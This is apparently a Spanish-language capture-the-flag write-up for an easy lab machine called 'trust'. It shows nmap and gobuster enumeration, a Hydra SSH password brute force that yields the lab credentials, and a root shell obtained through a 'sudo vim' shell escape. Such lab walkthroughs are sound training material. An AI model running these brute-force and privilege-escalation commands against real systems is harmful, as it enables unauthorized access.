# trust

dificultad: muy facil

!\[\[Pasted image 20251022170320.png]]

## Enumeración

maquina linux --> ttl 64

```
nmap -sS -p- --open -min-rate 5000 -n -Pn 172.18.0.2 -oN target
```

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 17:04 CEST Nmap scan report for 172.18.0.2 Host is up (0.0000020s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: BE:87:B3:1B:E5:21 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds

```
nmap -sCV 172.18.0.2 
```

22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA) |\_ 256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |\_http-server-header: Apache/2.4.57 (Debian) |\_http-title: Apache2 Debian Default Page: It works MAC Address: BE:87:B3:1B:E5:21 (Unknown) Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

enumerando archivos con gobuster nos encontramos un archivo secret.php

```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30
```

en este secret nos proporciona un nombre de usuario mario

mediante hydra hacemos brute force a ese usuario mediante ssh y nos da el login correcto para mario con contraseña chocolate

```
hydra -l mario -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://172.18.0.2 -s 22
```

```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

el usuario mario puede hacer vim como sudo

con lo cual mediante

```
sudo vim -c ':!/bin/sh'
```

nos hacemos root y ya estaría la maquina finalizada
